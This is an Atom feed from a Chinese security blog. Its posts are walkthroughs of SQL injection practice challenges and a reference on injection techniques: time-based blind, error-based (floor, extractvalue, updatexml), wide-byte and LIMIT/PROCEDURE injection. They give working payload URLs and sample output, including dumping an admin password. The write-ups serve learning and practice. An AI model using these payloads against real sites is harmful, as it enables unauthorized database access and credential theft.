<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>WLFSKY</title>
  
  <subtitle>我们终其一生都在寻找</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://wlfsky.com/"/>
  <updated>2018-01-23T07:50:36.614Z</updated>
  <id>http://wlfsky.com/</id>
  
  <author>
    <name>wlfsky</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SQL注入之盲注（时间和布尔）</title>
    <link href="http://wlfsky.com/2018/01/21/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%9B%B2%E6%B3%A8%EF%BC%88%E6%97%B6%E9%97%B4%E5%92%8C%E5%B8%83%E5%B0%94%EF%BC%89/"/>
    <id>http://wlfsky.com/2018/01/21/SQL注入之盲注（时间和布尔）/</id>
    <published>2018-01-21T09:35:56.000Z</published>
    <updated>2018-01-23T07:50:36.614Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><h2 id="题一：盲注"><a href="#题一：盲注" class="headerlink" title="题一：盲注"></a>题一：盲注</h2><p>题目出自：<a href="http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php" target="_blank" rel="noopener">网络安全实验室</a></p><p>1、首先要确定数据库名的长度</p><p>输入</p><p><a href="">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin’  and if(length((SELECT concat(database())))&lt;10,sleep(2),1)%23</a></p><p>查看等待时间，当为14时，等待，说明数据库名的长度为13</p><p>2、猜测数据库名</p><p>猜测第一个字符</p><p><a href="">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin’  and if(substr((SELECT concat(database())),1,1)=’0’,sleep(2),1)%23</a></p><p>当输入测试第一个字符为r时，等待</p><p>猜测第二个字符</p><p><a href="">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin’  and if(substr((SELECT concat(database())),2,1)=’0’,sleep(2),1)%23</a></p><p>当输入为0时，等待</p><p>……</p><p>依据猜测，数据库名为r0866cplushua</p><p>3、猜测数据库中有多少个表</p><p><a href="">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin’  and if((select count(TABLE_NAME) from information_schema.tables where table_schema=0x723038363663706C7573687561)=3,sleep(2),1)%23</a></p><p>经过多次测试，确认有3个表</p><p>4、猜测第一个表名的长度</p><p><a href="">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin’  and if(length((select TABLE_NAME from information_schema.tables where table_schema=0x723038363663706C7573687561 limit 0,1))=3,sleep(2),1)%23</a></p><p>猜测第一个表名长度为3</p><p>5、猜测表名</p><p><a href="">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin’ and if(substr((select TABLE_NAME from information_schema.tables where table_schema=0x723038363663706C7573687561 limit 1,1),5,1)=’o’,sleep(2),1)%23</a></p><p>…..</p><p>最后知道有log,user,motto表名</p><p>6、猜测表有多少列</p><p><a href="">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin’ and if((select count(COLUMN_NAME) from information_schema.columns where table_name=0x6D6F74746F )=3,sleep(2),1)%23</a></p><p>经过多次测试，表motto中有3列</p><p>7、猜测列名长度</p><p><a href="">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin’ and if(length((select COLUMN_NAME from information_schema.columns where table_name=0x6D6F74746F limit 0,1 ))=2,sleep(2),1)%23</a></p><p>第一个，2个字符，第二个8个字符，第三个是5个字符</p><p>8、猜测列名</p><p><a href="">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin’ and if(substr((select COLUMN_NAME from information_schema.columns where table_name=0x6D6F74746F limit 1,1 ),1,1)=’u’,sleep(2),1)%23</a></p><p>第一个为id,第二列为username,第三列为motto</p><p>9、猜测有多少行</p><p><a href="">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin’ and if((select count(*) from motto)=4,sleep(2),1)%23</a></p><p>结果为4行</p><p>10、猜测内容</p><p><a href="">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin’ and if(ASCII(substr((select motto from motto limit 0,1),1,1))=109,sleep(2),1)%23</a></p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="SQL注入" scheme="http://wlfsky.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="http://wlfsky.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入之三种报错型注入的用法</title>
    <link href="http://wlfsky.com/2018/01/21/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E4%B8%89%E7%A7%8D%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5%E7%9A%84%E7%94%A8%E6%B3%95/"/>
    <id>http://wlfsky.com/2018/01/21/SQL注入之三种报错型注入的用法/</id>
    <published>2018-01-21T07:32:04.000Z</published>
    <updated>2018-01-21T08:42:28.018Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><p><em>本文转载自：<a href="https://www.2cto.com/database/201410/344310.html" target="_blank" rel="noopener">红黑联盟</a></em></p><h2 id="通过floor报错"><a href="#通过floor报错" class="headerlink" title="通过floor报错"></a>通过floor报错</h2><p>可以通过如下一些利用代码</p><blockquote><p>and (select 1 from (select count(*),concat(floor(rand(0)*2),(注入暴数据语句))a from information_schema.tables group by a)b) #</p></blockquote><p>或者</p><blockquote><p>and (select count(*) from (select 1 union select null union select !1)x group by concat((注入暴数据语句),floor(rand(0)*2))) #</p></blockquote><p>举例如下：<br>首先进行正常查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[mysql]&gt; select * from article where id = 1;</span><br><span class="line">+<span class="comment">----+-------+---------+</span></span><br><span class="line">| id | title | content |</span><br><span class="line">+<span class="comment">----+-------+---------+</span></span><br><span class="line">| 1 | test | <span class="keyword">do</span> it |</span><br><span class="line">+<span class="comment">----+-------+---------+</span></span><br></pre></td></tr></table></figure><p>假如id输入存在注入的话，可以通过如下语句进行报错。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from article where id = 1 and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line">ERROR 1062 (23000): Duplicate entry '5.1.33-community-log1' for key 'group_key'</span><br></pre></td></tr></table></figure><p>可以看到成功爆出了Mysql的版本，如果需要查询其他数据，可以通过修改version()所在位置语句进行查询。<br>例如我们需要查询管理员用户名和密码：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Method1:</span><br><span class="line">mysql&gt; select * from article where id = 1 and (select 1 from (select count(*),concat((select pass from admin where id =1),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line">ERROR 1062 (23000): Duplicate entry 'admin8881' for key 'group_key'</span><br><span class="line">Method2:</span><br><span class="line">mysql&gt; select * from article where id = 1 and (select count(*) from (select 1 union select null union select !1)x group by concat((select pass from admin limit 1),floor(rand(0)*2)));</span><br><span class="line">ERROR 1062 (23000): Duplicate entry 'admin8881' for key 'group_key'</span><br></pre></td></tr></table></figure><h2 id="ExtractValue"><a href="#ExtractValue" class="headerlink" title="ExtractValue"></a>ExtractValue</h2><p>测试语句如下</p><blockquote><p>and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)))%23</p><p>and extractvalue(rand(),concat(0x3a,(SQL注入语句)))%23 </p></blockquote><p>实际测试过程</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from article where id = 1 and extractvalue(1, concat(0x5c,(select pass from admin limit 1)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: '\admin888'</span><br></pre></td></tr></table></figure><h2 id="UpdateXml"><a href="#UpdateXml" class="headerlink" title="UpdateXml"></a>UpdateXml</h2><p>测试语句如下</p><blockquote><p>and 1=(updatexml(1,concat(0x5e24,(select user()),0x5e24),1))</p></blockquote><p>实际测试过程</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from article where id = 1 and 1=(updatexml(1,concat(0x5e24,(select pass from admin limit 1),0x5e24),1));ERROR 1105 (HY000): XPATH syntax error: '^$admin888^$'</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="SQL注入" scheme="http://wlfsky.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="http://wlfsky.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入之报错型注入</title>
    <link href="http://wlfsky.com/2018/01/21/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5/"/>
    <id>http://wlfsky.com/2018/01/21/SQL注入之报错型注入/</id>
    <published>2018-01-21T07:21:38.000Z</published>
    <updated>2018-01-23T07:50:16.830Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><h2 id="题一：ErrorBased"><a href="#题一：ErrorBased" class="headerlink" title="题一：ErrorBased"></a>题一：ErrorBased</h2><p>本题目为手工注入学习题目，主要用于练习基于Mysql报错的手工注入。Sqlmap一定能跑出来，所以不必测试了。flag中不带key和#<br>该题目需要在题目平台登录</p><p>题目出自：<a href="http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin" target="_blank" rel="noopener">网络安全实验室</a></p><p>进入显示页面如下：</p><p><img src="/img/sql-bc-1.png" alt="sql-bc-1.png"></p><p>题目已经告诉该题为报错型注入，所以直接开始注入：</p><p><a href="">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin’ and extractvalue(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database())))%23</a></p><p><img src="/img/sql-bc-2.png" alt="sql-bc-2.png"></p><p>得到表名<code>log、motto、user</code> ，然后开始暴列名：</p><p><a href="">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin’ and extractvalue(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name=’motto’)))%23</a></p><p><img src="/img/sql-bc-3.png" alt="sql-bc-3.png"></p><p>得到列名<code>id、username、motto</code> ，然后开始暴数据：</p><p><a href="">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin’ and extractvalue(1,concat(0x3a,(select concat(id,0x3a,username,0x3a,motto) from motto limit 3,1)))%23</a></p><p><img src="/img/sql-bc-4.png" alt="sql-bc-4.png"></p><p>得到flag。</p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="SQL注入" scheme="http://wlfsky.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="http://wlfsky.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入之UNION的注意事项</title>
    <link href="http://wlfsky.com/2018/01/21/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BUNION%E7%9A%84%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/"/>
    <id>http://wlfsky.com/2018/01/21/SQL注入之UNION的注意事项/</id>
    <published>2018-01-21T04:45:42.000Z</published>
    <updated>2018-01-21T07:20:27.907Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><p><em>本文为转载文章</em></p><p>注入过程中经常会遇到UNION，很多人使用时会报错，主要是不熟悉UNION的使用规则，以下分别对UNION在不同数据库下的使用注意事项解说。</p><h2 id="关于UNION-与-ORDER-BY"><a href="#关于UNION-与-ORDER-BY" class="headerlink" title="关于UNION 与 ORDER BY"></a>关于UNION 与 ORDER BY</h2><h3 id="SQL-SERVER"><a href="#SQL-SERVER" class="headerlink" title="SQL SERVER"></a>SQL SERVER</h3><p>在SQL SERVER中，只有最后一个SELECT子句允许有ORDER BY 。前面的任何SELECT子句都不能有。<br>比如：<br>select name from a order by id union select content from b<br>会报在关键字UNION附近有语法错误。<br>order by 只能加在最后的select 的后面，改成这样：<br>select name from a union select content from b order by id<br>这样就正确了。</p><h3 id="ACCESS"><a href="#ACCESS" class="headerlink" title="ACCESS"></a>ACCESS</h3><p>ACCESS中没有强制要求ORDER BY 只能出现在最后一个SELECT子句中，所以<br>select name from a order by id union select content from b<br>在ACCESS中可以正确运行。</p><h3 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h3><p>MYSQL与SQL SERVER一样，强制要求ORDER BY 只能出现在最后一个SELECT子句中。<br>如果出现在了前面，会报错<br>ERROR 1221 (HY000): Incorrect usage of UNION and ORDER BY</p><h2 id="关于UNION-与FROM"><a href="#关于UNION-与FROM" class="headerlink" title="关于UNION 与FROM"></a>关于UNION 与FROM</h2><h3 id="SQL-SERVER-1"><a href="#SQL-SERVER-1" class="headerlink" title="SQL SERVER"></a>SQL SERVER</h3><p>只要UNION连接的几个查询的字段数一样且列的数据类型转换没有问题，就可以查询出结果。<br>下面这样的查询也是可以的：<br>select 1 union select 2;</p><h3 id="ACCESS-1"><a href="#ACCESS-1" class="headerlink" title="ACCESS"></a>ACCESS</h3><p>ACCESS的UNION好像强制要求它所连接的查询只能是select xxx from table的这种形式，<br>select 1 union select 2 这种查询在ACCESS里面执行的话会提示“查询输入必须包含至少一个表或者查询”<br>要将查询改成：<br>select 1 from table union select 2 from table<br>查询才能成功。<br>但是如果不用union，只是执行select 1，是允许的。</p><h3 id="MYSQL-1"><a href="#MYSQL-1" class="headerlink" title="MYSQL"></a>MYSQL</h3><p>与SQL SERVER基本一样。唯一不一样的地方就是，如果后面跟了where，就一定要跟from<br>select 1 where 1=1; 在mysql里面是会报错的，但是在sql server里面没有错误。<br>要改成<br>select 1 from table where 1=1;</p><h2 id="关于数据类型的转换"><a href="#关于数据类型的转换" class="headerlink" title="关于数据类型的转换"></a>关于数据类型的转换</h2><h3 id="SQL-SERVER-2"><a href="#SQL-SERVER-2" class="headerlink" title="SQL SERVER"></a>SQL SERVER</h3><p>SQL SERVER的数据类型转换是有优先级的，低优先级的会向高优先级的进行转换。<br>而并不是第一个SELECT的数据类型为准。<br>比如：<br>select 1,’f’ union select 1,2<br>上面的语句会报错，将varchar值’f’转换为……<br>这证明了转换不是以第一个SELECT列的数据类型为准的，虽然最终生成的列名是以第一个SELECT所用的列名为准。<br>下面是摘自SQL SERVER联机丛书的：<br>数据类型的优先顺序<br>当两个不同数据类型的表达式用运算符组合后，数据类型的优先顺序规则确定哪种数据类型要向另一种转换。<br>优先顺序低的数据类型向优先顺序高的数据类型转换。如果此转换不是所支持的固有转换，则返回错误。<br>当两个操作数表达式有相同的数据类型时，运算的结果就为那种数据类型。<br>下面是 Microsoft SQL Server 2000 数据类型的优先顺序：<br>sql_variant（最高）<br>datetime<br>smalldatetime<br>float<br>real<br>decimal<br>money<br>smallmoney<br>bigint<br>int<br>smallint<br>tinyint<br>bit<br>ntext<br>text<br>image<br>timestamp<br>uniqueidentifier<br>nvarchar<br>nchar<br>varchar<br>char<br>varbinary<br>binary（最低）<br>可以发现varchar比int的优先级低，所以varchar会向int进行转换，而不是int向字符串进行转换。</p><p>遇到这种情况可以使前面的查询结果为空就可以规避数据类型转换的报错，顺利执行第二个查询了。</p><h3 id="Access"><a href="#Access" class="headerlink" title="Access"></a>Access</h3><p>我没发现ACCESS在使用UNION的时候会有数据类型转换的问题，好像任何类型的字段都可以UNION在一起。</p><h3 id="MYSQL-2"><a href="#MYSQL-2" class="headerlink" title="MYSQL"></a>MYSQL</h3><p>MYSQL我没找到什么讲的比较清楚的类型转换的文章。<br>只简单地说一下，在字符器转换为数字类型的时候，会从字符串的第一个字符开始转换，直到遇到非数字为止。<br>比如7sie32 转成数字就是7，8732ds8转换数字就是8732<br>如果第一个字符就是非数字，就转换结果就是0。<br>在一些低版本的MYSQL中，下面这个查询：<br>select 1 union select ‘a’;<br>得到的结果是1 0，a被转换成0了。<br>不过这个问题在4.1以后的版本就没有了。<br>新版本的MYSQL具体是怎么转换的不太清楚，不过好像它会自动寻找合适的数据类型。然后将UNION的那些列进行转换。<br>也就是说我们基本上不用考虑它在UNION时的数据类型转换问题。</p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="SQL注入" scheme="http://wlfsky.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="http://wlfsky.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入之特殊注入</title>
    <link href="http://wlfsky.com/2018/01/20/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%89%B9%E6%AE%8A%E6%B3%A8%E5%85%A5/"/>
    <id>http://wlfsky.com/2018/01/20/SQL注入之特殊注入/</id>
    <published>2018-01-20T15:01:16.000Z</published>
    <updated>2018-01-23T08:03:09.774Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><h2 id="题一：防注入（宽字节注入）"><a href="#题一：防注入（宽字节注入）" class="headerlink" title="题一：防注入（宽字节注入）"></a>题一：防注入（<strong>宽字节注入</strong>）</h2><p>题目出自：<a href="http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php" target="_blank" rel="noopener">网络安全实验室</a></p><p>进入后页面显示如下：</p><p><img src="/img/sql-ts-1.png" alt="sql-ts-1.png"></p><p>使网址变为：</p><p><a href="">http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1%df’</a></p><p>发现报错，则有注入点。</p><p>然后输入<code>or 1=1 %23</code> :</p><p><a href="">http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1%df’ or 1=1 %23</a></p><p>发现和id=1的页面一样，则可以推断出页面一次只能输出一行，所以采用limit：</p><p><a href="">http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1%df’ or 1=1 limit N,1 %23</a></p><p>N从0开始递增，在N=2时，得到flag。</p><p><img src="/img/sql-ts-2.png" alt="sql-ts-2.png"></p><h2 id="题二：到底能不能回显（注入点在limit后面的用法）"><a href="#题二：到底能不能回显（注入点在limit后面的用法）" class="headerlink" title="题二：到底能不能回显（注入点在limit后面的用法）"></a>题二：到底能不能回显（<strong>注入点在limit后面的用法</strong>）</h2><p>小明经过学习，终于对SQL注入有了理解，她知道原来sql注入的发生根本原因还是数据和语句不能正确分离的原因，导致数据作为sql语句执行；但是是不是只要能够控制sql语句的一部分就能够来利用获取数据呢？小明经过思考知道，where条件可控的情况下，实在是太容易了，但是如果是在limit条件呢？<br>题目出自：<a href="http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0&amp;num=1" target="_blank" rel="noopener">网络安全实验室</a></p><p>进入后页面显示如下：</p><p><img src="/img/sql-ts-3.png" alt="sql-ts-3.png"></p><p>先举个例子：</p><blockquote><p> 在MYSQL中，order by 语句必须出现在最后一个select语句中。</p><p> select column from table where id &gt; 0 order by id limit [注入点]</p><p> 这里就不能使用union关键字，然后我们看一下mysql 5.x 文档中select的语法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">[ALL | <span class="keyword">DISTINCT</span> | <span class="keyword">DISTINCTROW</span> ]</span><br><span class="line">[<span class="keyword">HIGH_PRIORITY</span>]</span><br><span class="line">[<span class="keyword">STRAIGHT_JOIN</span>]</span><br><span class="line">[<span class="keyword">SQL_SMALL_RESULT</span>] [<span class="keyword">SQL_BIG_RESULT</span>] [<span class="keyword">SQL_BUFFER_RESULT</span>]</span><br><span class="line">[<span class="keyword">SQL_CACHE</span> | SQL_NO_CACHE] [<span class="keyword">SQL_CALC_FOUND_ROWS</span>]</span><br><span class="line">select_expr [, select_expr ...]</span><br><span class="line">[<span class="keyword">FROM</span> table_references</span><br><span class="line">[<span class="keyword">WHERE</span> where_condition]</span><br><span class="line"> [<span class="keyword">GROUP</span> <span class="keyword">BY</span> &#123;col_name | expr | <span class="keyword">position</span>&#125;</span><br><span class="line"> [<span class="keyword">ASC</span> | <span class="keyword">DESC</span>], ... [<span class="keyword">WITH</span> <span class="keyword">ROLLUP</span>]]</span><br><span class="line">[<span class="keyword">HAVING</span> where_condition]</span><br><span class="line">[<span class="keyword">ORDER</span> <span class="keyword">BY</span> &#123;col_name | expr | <span class="keyword">position</span>&#125;</span><br><span class="line">    [<span class="keyword">ASC</span> | <span class="keyword">DESC</span>], ...]</span><br><span class="line"> [<span class="keyword">LIMIT</span> &#123;[<span class="keyword">offset</span>,] <span class="keyword">row_count</span> | <span class="keyword">row_count</span> <span class="keyword">OFFSET</span> <span class="keyword">offset</span>&#125;]</span><br><span class="line">[<span class="keyword">PROCEDURE</span> procedure_name(argument_list)]</span><br><span class="line">[<span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">'file_name'</span> export_options</span><br><span class="line">     | <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">'file_name'</span></span><br><span class="line">     | <span class="keyword">INTO</span> var_name [, var_name]]</span><br><span class="line"> [<span class="keyword">FOR</span> <span class="keyword">UPDATE</span> | <span class="keyword">LOCK</span> <span class="keyword">IN</span> <span class="keyword">SHARE</span> <span class="keyword">MODE</span>]]</span><br></pre></td></tr></table></figure></blockquote><p>limit 关键字后面还有<em>PROCEDURE</em>和<em>INTO</em>关键字，<em>INTO</em>关键字可以用来写文件，</p><p>而<em>PROCEDURE</em> 关键字是这里的重点。MYSQL默认可用的存储过程只有<em>ANALYSE</em></p><p>我们在这里可以尝试用这个存储过程和报错回显注入：</p><p><a href="">http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0 procedure analyse(extractvalue(rand(),concat(0x3a,(select distinct concat(0x7e,table_name,0x7e) from information_schema.tables where table_schema=database() limit N,1))),1)%23&amp;num=1</a></p><p>使N从0开始递增，N=0和N=1时发现暴出表名<code>atricle</code> 和<code>user</code> ：</p><p><img src="/img/sql-ts-4.png" alt="sql-ts-4.png"></p><p><img src="/img/sql-ts-5.png" alt="sql-ts-5.png"></p><p>接着开始暴列名：</p><p><a href="">http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0 procedure analyse(extractvalue(rand(),concat(0x3a,(select distinct concat(0x7e,column_name,0x7e) from information_schema.columns where table_name=表名的十六进制 limit N,1))),1)%23&amp;num=1</a></p><p>得到<strong>article表</strong>中的字段：id、title、contents、isread。<strong>user表</strong>中的字段：id、username、password、lastloginIP。</p><p>最后暴出数据：</p><p><a href="">http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0 procedure analyse(extractvalue(rand(),concat(0x3a,(select distinct concat(0x7e,id,0x7e,username,0x7e,password) from user limit 2,1))),1)%23&amp;num=1</a></p><p><img src="/img/sql-ts-6.png" alt="sql-ts-6.png"></p><p>得到flag。</p><h2 id="题三：邂逅（图片型宽字节注入）"><a href="#题三：邂逅（图片型宽字节注入）" class="headerlink" title="题三：邂逅（图片型宽字节注入）"></a>题三：邂逅（<strong>图片型宽字节注入</strong>）</h2><p>小明今天出门看见了一个漂亮的帅哥和漂亮的美女，于是他写到了他的日记本里。<br>题目出自：<a href="http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/" target="_blank" rel="noopener">网络安全实验室</a></p><p>进入页面后显示：</p><p><img src="/img/sql-ts-7.png" alt="sql-ts-7.png"></p><p>F12得到一些信息：</p><p><img src="/img/sql-ts-8.png" alt="sql-ts-8.png"></p><p>在网址后面加<code>images/dog1.jpg?id=1%df%27</code> ：</p><p><a href="">http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg?id=1%df%27</a></p><p><img src="/img/sql-ts-9.png" alt="sql-ts-9.png"></p><p>发现注入点，然后开始注入。</p><p><strong>方法一：</strong></p><p>直接构造如下网址 :</p><p><a href="">http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg?id=1%df%27 or 1=1 %23</a></p><p>得到原始网站，则可以猜测一次输出一个数据，然后使用<strong>limit</strong> 来暴出flag:</p><p><a href="">http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg?id=1%df%27 or 1=1 limit 2,1 %23</a></p><p><img src="/img/sql-ts-10.png" alt="sql-ts-10.png"></p><p>得到flag。</p><p><strong>方法二：</strong></p><p>猜解SQL查询语句的字段数：</p><p><a href="">http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg?id=1%df%27 order by N %23</a></p><p><img src="/img/sql-ts-11.png" alt="sql-ts-11.png"></p><p>得到SQL查询语句的字段数为 4。然后确定显示的字段位置：</p><p><a href="">http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg?id=1%df%27 union select 1,2,3,4%23</a></p><p><img src="/img/sql-ts-12.png" alt="sql-ts-12.png"></p><p>得到显示位为3。然后开始暴表名：</p><p><a href="">http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg?id=1%df%27 union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=database()%23</a></p><p><img src="/img/sql-ts-13.png" alt="sql-ts-13.png"></p><p>得到表名：<code>article</code> 和<code>pic</code> 。然后开始暴字段名：</p><p><a href="">http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg?id=1%df%27 union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name=表名的十六进制%23</a></p><p><img src="/img/sql-ts-14.png" alt="sql-ts-14.png"></p><p>得到<code>pic</code>表的字段名为：<code>id,picname,data,text</code>，然后开始暴数据：</p><p><a href="">http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg?id=1%df%27 union select 1,2,group_concat(picname),4 from pic%23</a></p><p><img src="/img/sql-ts-15.png" alt="sql-ts-15.png"></p><p>得到flag的图片名字<code>flagishere_askldjfklasjdfl.jpg</code> ，然后访问图片文件：</p><p><a href="">http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/flagishere_askldjfklasjdfl.jpg</a></p><p><img src="/img/sql-ts-10.png" alt="sql-ts-10.png"></p><p>得到flag。</p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="SQL注入" scheme="http://wlfsky.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="http://wlfsky.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入之可联合查询注入</title>
